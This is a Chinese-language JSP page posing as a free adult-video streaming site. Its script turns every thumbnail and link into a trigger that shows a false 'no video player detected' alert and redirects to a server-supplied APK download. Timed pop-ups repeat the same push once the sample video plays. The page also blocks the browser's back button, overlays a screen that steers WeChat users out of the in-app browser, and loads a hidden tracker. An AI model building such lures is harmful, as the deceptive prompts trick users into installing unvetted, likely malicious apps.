<%@ page language="java" pageEncoding="utf-8"%>
<%
	Object url = request.getAttribute("url");
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<!-- saved from url=(0036)http://dl.miliroom.com/v3/index.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=gbk">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta charset="gbk">
<title>手机快播，下载官方APP，免费观看所有电影</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<link rel="stylesheet" type="text/css" href="../../css/video.css">
<script type="text/javascript">

var t = setInterval("playvideo()",500);
function playvideo(){
	var myVideo=document.getElementById("video1");  
	if(myVideo.paused == false)
	{
	     videoPlay(); 
	     clearTimeout(t);
	}
}


</script>
<script type="text/javascript">
String.prototype.format = function(args) {
    var result = this;
    if (arguments.length > 0) {    
        for (var key in args) {
            if(args[key]!=undefined){
                result = result.replace(new RegExp("{"+key+"}", "g"), args[key]);
            }
        }
    }
    return result;
}

// var browser = {
//     versions: function () {
//         var o = navigator.userAgent; navigator.appVersion;
//         return {
//             mobile: !!o.match(/AppleWebKit.*Mobile/i) || !!o.match(/MIDP|SymbianOS|NOKIA|SAMSUNG|LG|NEC|TCL|Alcatel|BIRD|DBTEL|Dopod|PHILIPS|HAIER|LENOVO|MOT-|Nokia|SonyEricsson|SIE-|Amoi|ZTE/),
//             mac: o.indexOf("Mac") > -1,
//             ios: !!o.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
//             android: o.indexOf("Android") > -1 || o.indexOf("Linux") > -1,
//             weixin: !!o.match(/MicroMessenger/i),
//             qq:(!!o.match(/QQ/i) && (!!o.match(/NetType/i)||!!o.match(/Pixel/i)))
//         }
//     }(),
//     language: (navigator.browserLanguage || navigator.language).toLowerCase()
// }

// if (browser.versions.android) {
//     //APK链接
//     var durl = "http://kovse.janteng.cn/13Ps";
// } else if (browser.versions.ios) {
//     var durl = "http://kovse.janteng.cn/13Ps";
// } else {
//     var durl = "http://kovse.janteng.cn/13Ps";//刚开始的链接
// }

var apkurl = "<%=url%>";
function g(name) {
    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
    var r = window.location.search.substr(1).match(reg);
    if (r != null) return unescape(r[2]); return null;
}
	
function downfile(){
	location.href=apkurl;
}

function showTip(text, down_url, delay, set_timer){
	if(set_timer==true){
		window.setTimeout("showTip('"+ text +"', '" + down_url + "', '" + delay + "', false)", delay)
	}else{
		alert(text)
		location.href=down_url;
	}
}


function videoPlay(){
	showTip("★狠狠撸看片神器2万部成人影片，立即下载安装免费观看？★", "<%=url%>", 500, true);
	showTip("★狠狠撸看片神器2万部成人影片，立即下载安装免费观看？★", "<%=url%>", 6000, true);
	showTip("★狠狠撸看片神器2万部成人影片，立即下载安装免费观看？★", "<%=url%>", 12000, true);
	showTip("★狠狠撸看片神器2万部成人影片，立即下载安装免费观看？★", "<%=url%>", 20000, true);
}

var karr=0;

var tips = '警告：手机快播含有成人内容!适合18岁以上人群浏览.\n\n没有检测到您手机可用视频播放器,本站已停用所有迅雷资源，您是否立刻安装观看？\n\n安装后运行即可看4W部高清成人电影！\n\n感谢您对手机快播的支持，一路同行，感谢有你。';


function goDown(){
    karr++;
    alert(tips);
    var durl = "<%=url%>";
    if(karr==1)
    {
        karr==0;
         var durl = "<%=url%>";
    }
    else if(karr==2)
    {

        karr=0;
        durl="<%=url%>"; 
    }
    location.href=durl;
    //karr==3 的链接

}
</script>
</head>
<script type="text/javascript">

        history.pushState({ page: 1 }, "title 1", "#nbb");

        window.onhashchange = function (event) {window.location.hash = "nbb";};

    </script>
<body>
<a href="javascript:void(0)" onclick="return goDown();">
<div class="header">
    <div class="header_tip">立即下载本站影片资源专用播放器</div>
</div>
</a>

<div class="movies slide">
	<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink">
		<div class="moviesCover">
            <video id="video1" controls="" width="100%" src="http://lydownload-10069167.file.myqcloud.com/au27/ldy/ldy.mp4" -webkit-playsinline="true"></video>
			<span class="play">在线观看</span>
			<span class="arrow"></span>
			<em class="bg em1"></em>
			<em class="time em1">安装播放器</em>
		</div>
		<p>东京热最新(安装播放器后可观看更多资源)</p>
		<div class="status">
			<span class="view">Views: 426548</span>
			<span class="left">Rating:</span>
			<span class="star"></span>
			<span class="right">Quality: <strong>HD</strong></span>
		</div>
	</a>
	<div class="clear"></div>
</div>

<div class="movies">
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/1.jpg" alt="モデルコレクション 羽田真理"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">43:51</em></div><p>モデルコレクション 羽田真理</p><div class="status"><span class="view">Views: 137243</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/2.jpg" alt="彼氏目前的彼女Part13 富岡由紀"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">59:10</em></div><p>彼氏目前的彼女Part13 富岡由紀</p><div class="status"><span class="view">Views: 116142</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/5.jpg" alt="過酷肉慾3P~前田かおり"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">63:25</em></div><p>過酷肉慾3P~前田かおり</p><div class="status"><span class="view">Views: 138180</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/4.jpg" alt="初裏無修正解禁-Ray"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">214:53</em></div><p>初裏無修正解禁-Ray</p><div class="status"><span class="view">Views: 92233</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/6.jpg" alt="空天使170-2 高橋さやか"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">53:17</em></div><p>空天使170-2 高橋さやか</p><div class="status"><span class="view">Views: 68057</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/3.jpg" alt="憧護士衣服SEX 宮前ことね"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">194:28</em></div><p>憧護士衣服SEX 宮前ことね</p><div class="status"><span class="view">Views: 62267</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/11.jpg" alt="職業美人営業 篠田あゆみ"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">47:14</em></div><p>職業美人営業 篠田あゆみ</p><div class="status"><span class="view">Views: 57271</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/7.jpg" alt="兩穴最愛美少女-松山ゆう"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">67:24</em></div><p>兩穴最愛美少女-松山ゆう</p><div class="status"><span class="view">Views: 51437</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/9.jpg" alt="視界侵入~大澤美咲"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">176:29</em></div><p>視界侵入~大澤美咲</p><div class="status"><span class="view">Views: 40295</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/10.jpg" alt="淫乱人妻とセッ吉井美希"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">223:16</em></div><p>淫乱人妻とセッ吉井美希</p><div class="status"><span class="view">Views: 35524</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/12.jpg" alt="転落人生~鈴木さとみ"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">43:51</em></div><p>転落人生~鈴木さとみ</p><div class="status"><span class="view">Views: 34184</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>
<a href="javascript:void(0)" onclick="return goDown();" class="moviesLink"><div class="moviesCover"><img src="../../img/8.jpg" alt="清純美人妻~桜井心菜"><span class="play">免费点播</span><span class="arrow"></span><em class="bg"></em><em class="time">64:35</em></div><p>清純美人妻~桜井心菜</p><div class="status"><span class="view">Views: 21856</span><span class="left">Rating:</span><span class="star"></span><span class="right">Quality: <strong>HD</strong></span></div></a>

<div class="clear"></div>
</div>

<div class="footer">
	<div class="footerDown">
		<a href="javascript:void(0)" onclick="return goDown();">播放器下载</a>
		<a href="javascript:void(0)" onclick="return goDown();" class="more">更多精彩...</a>
	</div>
	<p>警告：本站含大量成人内容 仅供21周岁以上人群浏览！</p>
	<p>请遵守当地法律法规，不要随意传播！</p>
</div>


<a href="javascript:void(0)" onclick="return goDown();" class="float">
点我下载 <span>手机快播</span> 观看海量资源
</a>
<script>
     var Media = document.getElementById("video1");

    Media.addEventListener('ended',function(){
        alert(播放完成);
    });
     
</script>


<div style="display:none;">
<script src="http://s4.cnzz.com/z_stat.php?id=1260218668&web_id=1260218668" language="JavaScript"></script>
</div>
<script type="text/javascript">
	function is_weixin() {
	    var ua = navigator.userAgent.toLowerCase();
	    if (ua.match(/MicroMessenger/i) == "micromessenger") {
	        return true;
	    } else {
	        return false;
	    }
	}
	var isWeixin = is_weixin();
	var winHeight = typeof window.innerHeight != 'undefined' ? window.innerHeight : document.documentElement.clientHeight;
	function loadHtml(){
		var div = document.createElement('div');
		div.id = 'weixin-tip';
		div.innerHTML = '<p><img src="../../img/live_weixin.png" alt="微信打开"/></p>';
		document.body.appendChild(div);
	}
	
	function loadStyleText(cssText) {
        var style = document.createElement('style');
        style.rel = 'stylesheet';
        style.type = 'text/css';
        try {
            style.appendChild(document.createTextNode(cssText));
        } catch (e) {
            style.styleSheet.cssText = cssText; //ie9以下
        }
           var head=document.getElementsByTagName("head")[0]; //head标签之间加上style样式
           head.appendChild(style); 
    }
    var cssText = "#weixin-tip{position: fixed; left:0; top:0; background: rgba(0,0,0,0.8); filter:alpha(opacity=80); width: 100%; height:100%; z-index: 999999999;} #weixin-tip p{text-align: center; margin-top: 10%; padding:0 5%;} #weixin-tip img{display:block; z-index:9; width:100%; height:auto;}";
	if(isWeixin){
		loadHtml();
		loadStyleText(cssText);
	}
</script>
</body></html>